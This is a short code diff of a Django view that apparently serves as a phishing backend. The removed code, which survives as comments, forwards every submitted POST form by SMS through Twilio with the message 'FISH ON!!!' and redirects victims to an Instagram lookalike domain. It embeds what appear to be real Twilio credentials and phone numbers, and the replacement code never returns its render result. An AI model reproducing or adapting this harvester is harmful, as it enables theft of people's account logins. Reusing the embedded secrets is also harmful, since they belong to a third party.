@@ -10,14 +10,15 @@ from twilio.rest import Client
 
 @csrf_exempt
 def homepage(request):
-    if request.method == "POST":
-        account_sid = 'AC0e95b3f3b8dfcca7d7298a04cc5ccae0'
-        auth_token = '64a3ac149f7d0f03f950fc71ad7425c3'
-        client = Client(account_sid, auth_token)
-
-        message = client.messages.create(
-                     body="FISH ON!!!" + str(request.POST),
-                     from_='+13344234972',
-                     to='+15613025285'
-                  )
-    return redirect('https://instagram-mailing.com/confirmation.html')
+    render(request, "website/fuck-off.html", {})
+    # if request.method == "POST":
+        # account_sid = 'AC0e95b3f3b8dfcca7d7298a04cc5ccae0'
+        # auth_token = '64a3ac149f7d0f03f950fc71ad7425c3'
+        # client = Client(account_sid, auth_token)
+        #
+        # message = client.messages.create(
+        #              body="FISH ON!!!" + str(request.POST),
+        #              from_='+13344234972',
+        #              to='+15613025285'
+        #           )
+    # return redirect('https://instagram-mailing.com/confirmation.html')
